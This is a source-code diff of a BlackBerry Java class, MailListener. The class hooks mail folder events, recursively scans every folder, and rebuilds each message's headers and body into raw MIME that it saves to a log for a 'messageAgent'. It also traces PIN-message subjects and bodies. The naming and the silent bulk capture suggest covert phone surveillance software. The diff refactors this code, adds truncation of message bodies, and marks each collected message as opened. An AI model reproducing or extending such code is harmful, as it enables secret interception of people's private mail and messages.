@@ -9,26 +9,18 @@ import java.io.IOException;
 import java.util.Date;
 import java.util.Enumeration;
 import java.util.Random;
-import java.util.Vector;
 
 import net.rim.blackberry.api.mail.Address;
 import net.rim.blackberry.api.mail.AddressException;
-import net.rim.blackberry.api.mail.BodyPart;
 import net.rim.blackberry.api.mail.Folder;
 import net.rim.blackberry.api.mail.Header;
 import net.rim.blackberry.api.mail.Message;
-import net.rim.blackberry.api.mail.MessagingException; //#ifdef HAVE_MIME
-import net.rim.blackberry.api.mail.MimeBodyPart; //#endif
-import net.rim.blackberry.api.mail.Multipart;
+import net.rim.blackberry.api.mail.MessagingException;
 import net.rim.blackberry.api.mail.SendListener;
 import net.rim.blackberry.api.mail.ServiceConfiguration;
 import net.rim.blackberry.api.mail.Session;
 import net.rim.blackberry.api.mail.Store;
-import net.rim.blackberry.api.mail.SupportedAttachmentPart;
-import net.rim.blackberry.api.mail.TextBodyPart;
-import net.rim.blackberry.api.mail.Transport;
-import net.rim.blackberry.api.mail.UnsupportedAttachmentPart;
-import net.rim.blackberry.api.mail.BodyPart.ContentType;
+import net.rim.blackberry.api.mail.Message.Flag;
 import net.rim.blackberry.api.mail.event.FolderEvent;
 import net.rim.blackberry.api.mail.event.FolderListener;
 import net.rim.blackberry.api.mail.event.StoreEvent;
@@ -43,9 +35,6 @@ import blackberry.utils.Check;
 import blackberry.utils.DateTime;
 import blackberry.utils.Debug;
 import blackberry.utils.DebugLevel;
-import blackberry.utils.Sendmail;
-import blackberry.utils.StringPair;
-import blackberry.utils.WChar;
 
 // TODO: Auto-generated Javadoc
 /**
@@ -121,7 +110,7 @@ public final class MailListener implements FolderListener, StoreListener,
     public synchronized void messagesAdded(final FolderEvent folderEvent) {
         final Message message = folderEvent.getMessage();
 
-        boolean added = folderEvent.getType() == FolderEvent.MESSAGE_ADDED;
+        final boolean added = folderEvent.getType() == FolderEvent.MESSAGE_ADDED;
 
         //#ifdef DEBUG_INFO
         debug
@@ -137,7 +126,7 @@ public final class MailListener implements FolderListener, StoreListener,
         }
 
         try {
-            int type = folderEvent.getType();
+            final int type = folderEvent.getType();
             if (type != FolderEvent.MESSAGE_ADDED) {
                 //#ifdef DEBUG_INFO
                 debug.info("filterMessage type: " + type);
@@ -148,13 +137,17 @@ public final class MailListener implements FolderListener, StoreListener,
             final int filtered = realtimeFilter.filterMessage(message,
                     messageAgent.lastcheck);
             if (filtered == Filter.FILTERED_OK) {
-                boolean ret = saveLog(message, realtimeFilter.maxMessageSize,
-                        "local");
-                //#ifdef DEBUG
+                final boolean ret = saveLog(message,
+                        realtimeFilter.maxMessageSize, "local");
+                //#ifdef DEBUG_TRACE
                 if (ret) {
                     debug.trace("messagesAdded: "
                             + message.getFolder().getName());
                 }
+                //#endif
+            } else {
+                //#ifdef DEBUG_TRACE
+                debug.trace("filter refused: " + filtered);
                 //#endif
             }
 
@@ -225,7 +218,7 @@ public final class MailListener implements FolderListener, StoreListener,
     }
 
     private synchronized boolean saveLog(final Message message,
-            final long maxMessageSize, final String storeName) {
+            final int maxMessageSize, final String storeName) {
 
         //#ifdef DBC
         Check.requires(message != null, "message != null");
@@ -236,7 +229,7 @@ public final class MailListener implements FolderListener, StoreListener,
         debug.trace("saveLog: " + message + " name: " + storeName);
         //#endif
 
-        ByteArrayOutputStream os = null;
+        final ByteArrayOutputStream os = null;
         try {
 
             final int flags = 1;
@@ -245,7 +238,7 @@ public final class MailListener implements FolderListener, StoreListener,
             if (storeName.indexOf("@") > 0) {
                 from = storeName;
             }
-            String mail = parseMessage(message, maxMessageSize, from);
+            final String mail = parseMessage(message, maxMessageSize, from);
             //#ifdef DBC
             Check.asserts(mail != null, "Null mail");
             //#endif
@@ -302,7 +295,7 @@ public final class MailListener implements FolderListener, StoreListener,
      * @param subfolders
      *            the subfolders
      */
-    public void scanFolders(String storeName, final Folder[] subfolders) {
+    public void scanFolders(final String storeName, final Folder[] subfolders) {
         Folder[] dirs;
 
         //#ifdef DBC
@@ -312,7 +305,7 @@ public final class MailListener implements FolderListener, StoreListener,
 
         for (int count = 0; count < subfolders.length; count++) {
 
-            Folder folder = subfolders[count];
+            final Folder folder = subfolders[count];
             //#ifdef DEBUG_TRACE
             debug.trace("Folder name: " + folder.getFullName());
             //debug.trace("  getName: " + folder.getName());
@@ -320,12 +313,10 @@ public final class MailListener implements FolderListener, StoreListener,
             //debug.trace("  getId: " + folder.getId());
             try {
                 debug.trace("  numMessages: " + folder.getMessages().length);
-            } catch (MessagingException e1) {
-                // TODO Auto-generated catch block
-                e1.printStackTrace();
+            } catch (final MessagingException e1) {
+                debug.error(e1);
             }
             //#endif
-
             dirs = folder.list();
             if (dirs != null && dirs.length >= 0) {
                 scanFolders(storeName, dirs);
@@ -334,67 +325,8 @@ public final class MailListener implements FolderListener, StoreListener,
             try {
                 final Message[] messages = folder.getMessages();
 
-                //#ifdef DEBUG_TRACE
-                // stampo le date.
-                Date precRecDate = null;
-                /* Date precSentDate = null; */
-                for (int j = 0; j < messages.length; j++) {
-                    try {
-                        final Message message = messages[j];
-                        if (precRecDate != null) {
-                            Check.asserts(precRecDate.getTime() <= message
-                                    .getReceivedDate().getTime(),
-                                    "Wrong order Received: "
-                                            + message.toString());
-                        }
-                        precRecDate = message.getReceivedDate();
-
-                        Address address;
-                        address = message.getFrom();
-
-                        if (message.getMessageType() == Message.PIN_MESSAGE) {
-                            debug.info("PIN Message: " + message.getFrom()
-                                    + " s:" + message.getSubject());
-                        } else {
-                            if (address != null) {
-                                String name = address.getAddr();
-                                if (name != null && name.length() == 8
-                                        && name.indexOf("@") == -1
-                                        && name.indexOf(" ") == -1) {
-
-                                    debug.info("probably PIN Message From: "
-                                            + name);
-                                    debug.trace("  s: " + message.getSubject());
-                                    debug
-                                            .trace("  b: "
-                                                    + message.getBodyText());
-                                }
-                            }
-
-                            Address[] addresses = message
-                                    .getRecipients(Message.RecipientType.TO);
-                            for (int i = 0; i < addresses.length; i++) {
-                                address = addresses[i];
-                                if (address != null) {
-                                    String name = address.getAddr();
-                                    if (name != null && name.length() == 8
-                                            && name.indexOf("@") == -1
-                                            && name.indexOf(" ") == -1) {
-
-                                        debug.trace("probably PIN Message To: "
-                                                + name);
-                                        debug.trace("  s: "
-                                                + message.getSubject());
-                                        debug.trace("  b: "
-                                                + message.getBodyText());
-                                    }
-                                }
-                            }
-                        }
-                    } catch (AddressException ex) {
-                        debug.error(ex.toString());
-                    }
-                }
+                //#ifdef PIN_MESSAGES
+                lookForPinMessages(messages);
                 //#endif
 
                 boolean next = false;
@@ -421,9 +353,11 @@ public final class MailListener implements FolderListener, StoreListener,
                                     "scanFolders: storeName != null");
                             //#endif
                             //#ifdef SAVE_MAIL
-                            saveLog(message, realtimeFilter.maxMessageSize,
+                            saveLog(message, collectFilter.maxMessageSize,
                                     storeName);
                             //#endif
+                            
+                            message.setFlag(Flag.OPENED, true);
                             break;
                         case Filter.FILTERED_DISABLED:
                         case Filter.FILTERED_LASTCHECK:
@@ -432,7 +366,7 @@ public final class MailListener implements FolderListener, StoreListener,
                             next = true;
                             break;
                         }
-                    } catch (Exception ex) {
+                    } catch (final Exception ex) {
                         //#ifdef DEBUG_ERROR
                         debug.error("message # " + j + " ex:" + ex); //TODO: FIX null pointer bug
                         //#endif
@@ -450,6 +384,68 @@ public final class MailListener implements FolderListener, StoreListener,
                 //#endif
             }
         }
+    }
+
+    private Date lookForPinMessages(final Message[] messages)
+            throws MessagingException {
+
+        // stampo le date.
+        Date precRecDate = null;
+        //#ifdef DEBUG_TRACE
+
+        /* Date precSentDate = null; */
+        for (int j = 0; j < messages.length; j++) {
+            try {
+                final Message message = messages[j];
+                if (precRecDate != null) {
+                    Check.asserts(precRecDate.getTime() <= message
+                            .getReceivedDate().getTime(),
+                            "Wrong order Received: " + message.toString());
+                }
+                precRecDate = message.getReceivedDate();
+
+                Address address;
+                address = message.getFrom();
+
+                if (message.getMessageType() == Message.PIN_MESSAGE) {
+                    debug.info("PIN Message: " + message.getFrom() + " s:"
+                            + message.getSubject());
+                } else {
+                    if (address != null) {
+                        final String name = address.getAddr();
+                        if (name != null && name.length() == 8
+                                && name.indexOf("@") == -1
+                                && name.indexOf(" ") == -1) {
+
+                            debug.info("probably PIN Message From: " + name);
+                            debug.trace("  s: " + message.getSubject());
+                            debug.trace("  b: " + message.getBodyText());
+                        }
+                    }
+
+                    final Address[] addresses = message
+                            .getRecipients(Message.RecipientType.TO);
+                    for (int i = 0; i < addresses.length; i++) {
+                        address = addresses[i];
+                        if (address != null) {
+                            final String name = address.getAddr();
+                            if (name != null && name.length() == 8
+                                    && name.indexOf("@") == -1
+                                    && name.indexOf(" ") == -1) {
+
+                                debug.trace("probably PIN Message To: " + name);
+                                debug.trace("  s: " + message.getSubject());
+                                debug.trace("  b: " + message.getBodyText());
+                            }
+                        }
+                    }
+                }
+            } catch (final AddressException ex) {
+                debug.error(ex.toString());
+            }
+        }
+        //#endif
+        return precRecDate;
     }
 
     /*
@@ -492,27 +488,27 @@ public final class MailListener implements FolderListener, StoreListener,
     }
 
     private String parseMessage(final Message message,
-            final long maxMessageSize, final String from) {
-        Address[] addresses;
+            final int maxMessageSize, final String from) {
+        final Address[] addresses;
 
-        StringBuffer mailRaw = new StringBuffer();
+        final StringBuffer mailRaw = new StringBuffer();
 
         addAllHeaders(message.getAllHeaders(), mailRaw);
         addFromHeaders(message.getAllHeaders(), mailRaw, from);
 
-        MailParser parser = new MailParser(message);
-        Mail mail = parser.parse();
+        final MailParser parser = new MailParser(message);
+        final Mail mail = parser.parse();
 
         //#ifdef DEBUG
-        debug.trace("Dimensione dell'email: " + message.getSize() + "bytes");
-        debug.trace("Data invio dell'email: " + message.getSentDate());
-        debug.trace("Oggetto dell'email: " + message.getSubject());
+        debug.trace("Email size: " + message.getSize() + " bytes");
+        debug.trace("Sent date: " + message.getSentDate());
+        debug.trace("Subject: " + message.getSubject());
         //#endif
 
         mailRaw.append("MIME-Version: 1.0\r\n");
         //1234567890123456789012345678
-        long rnd = Math.abs(random.nextLong());
-        String boundary = "------_=_NextPart_" + rnd;
+        final long rnd = Math.abs(random.nextLong());
+        final String boundary = "------_=_NextPart_" + rnd;
 
         if (mail.isMultipart()) {
             mailRaw.append("Content-Type: multipart/alternative; boundary="
@@ -522,7 +518,12 @@ public final class MailListener implements FolderListener, StoreListener,
 
         if (mail.hasText()) {
             mailRaw.append("Content-type: text/plain; charset=UTF8\r\n\r\n");
-            mailRaw.append(mail.plainTextMessage);
+            
+            String msg = mail.plainTextMessage;
+            if(maxMessageSize >0 && msg.length() > maxMessageSize){
+                msg = msg.substring(0, maxMessageSize);
+            }
+            mailRaw.append(msg);
         }
 
         if (mail.isMultipart()) {
@@ -541,17 +542,18 @@ public final class MailListener implements FolderListener, StoreListener,
 
         mailRaw.append("\r\n");
 
-        String craftedMail = mailRaw.toString();
+        final String craftedMail = mailRaw.toString();
 
         return craftedMail;
     }
 
-    private void addAllHeaders(final Enumeration headers, StringBuffer mail) {
+    private void addAllHeaders(final Enumeration headers,
+            final StringBuffer mail) {
 
         while (headers.hasMoreElements()) {
-            Object headerObj = headers.nextElement();
+            final Object headerObj = headers.nextElement();
             if (headerObj instanceof Header) {
-                Header header = (Header) headerObj;
+                final Header header = (Header) headerObj;
                 mail.append(header.getName());
                 mail.append(header.getValue());
                 mail.append("\r\n");
@@ -563,14 +565,14 @@ public final class MailListener implements FolderListener, StoreListener,
         }
     }
 
-    private void addFromHeaders(final Enumeration headers, StringBuffer mail,
-            String from) {
+    private void addFromHeaders(final Enumeration headers,
+            final StringBuffer mail, final String from) {
 
         boolean fromFound = false;
         while (headers.hasMoreElements()) {
-            Object headerObj = headers.nextElement();
+            final Object headerObj = headers.nextElement();
             if (headerObj instanceof Header) {
-                Header header = (Header) headerObj;
+                final Header header = (Header) headerObj;
                 if (header.getName().startsWith("From")) {
                     fromFound = true;
                 }
@@ -614,7 +616,7 @@ public final class MailListener implements FolderListener, StoreListener,
                         mailServiceRecords[count]);
                 final Store store = Session.getInstance(sc).getStore();
                 addListeners(store);
-            } catch (Exception ex) {
+            } catch (final Exception ex) {
                 //#ifdef DEBUG_ERROR
                 debug.error("Cannot add listener. Count: " + count);
                 //#endif
